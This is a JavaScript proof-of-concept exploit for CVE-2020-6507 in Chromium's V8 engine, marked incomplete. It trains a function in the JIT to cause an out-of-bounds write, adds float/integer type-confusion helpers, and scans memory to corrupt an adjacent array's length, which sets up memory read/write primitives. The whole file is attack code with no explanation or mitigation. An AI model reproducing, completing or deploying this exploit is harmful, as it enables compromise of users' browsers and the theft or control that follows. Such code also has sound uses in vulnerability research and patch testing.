/*
 *** INCOMPLETE ***

CVE-2020-6507
HEAD @ 5db4a28ef75f893e85b7f505f5528cc39e9deef5

https://bugs.chromium.org/p/chromium/issues/detail?id=1086890
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6507
*/

let bs = new ArrayBuffer(8);
let fs = new Float64Array(bs);
let is = new BigUint64Array(bs);

const ftoi = x => {
  fs[0] = x;
  return is[0];
}

const itof = x => {
  is[0] = x;
  return fs[0];
}

const hex = x => {
  return '0x' + x.toString(16);
}

let _x = Array(262144).fill(1.1);
_x = Array(255).fill(_x);
_x.push(Array(262140).fill(1.1));

_x = Array.prototype.concat.apply([], _x);
_x.splice(_x.length, 0, 1.1, 1.1, 1.1);

let _l = itof((1337n << 48n) + 1n);

function foo(x, l) {
  var x = x.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0);

  let a = [1.1, 1.1];
  let cor = [1.1];

  a[x] = l;
  return [a, cor];
}

function bar(x) {
  let i = 0x1120000;
  while (i < 0x1127000) {
    if ((ftoi(x[i]) & 0xffffn) == 0x1337n)
      return i;

    i++;
  }
}

/* flt.elements @ oob[53] */
/* obj.elements @ oob[] */
let flt = [1.1];
let tmp = {a: 1};
let obj = [tmp];;

let oob = [
  itof(0x1337133713371337n)
];

for (let i = 0; i < 30000; i++)
  foo(_x, _l);

let cor = foo(_x, _l)[1];

let i = bar(cor);
cor[i+271] = itof((ftoi(cor[i+271]) << 32n) + 1337n);
